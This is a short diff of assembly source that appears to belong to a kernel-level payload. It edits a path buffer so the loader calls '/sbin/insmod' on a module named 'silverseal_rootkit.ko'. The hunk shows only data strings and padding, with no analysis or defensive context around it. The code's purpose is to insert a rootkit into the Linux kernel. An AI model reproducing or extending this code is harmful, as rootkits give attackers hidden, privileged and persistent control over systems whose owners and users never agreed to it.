@@ -13,7 +13,7 @@ work_struct_data:
     times   32 db 0
 
 path_buffer:
-    db      "/sbin/modprobe", 0
+    db      "/sbin/insmod", 0
     db      "/silverseal_rootkit.ko", 0
     times   (128 - ($ - path_buffer)) db 0
 
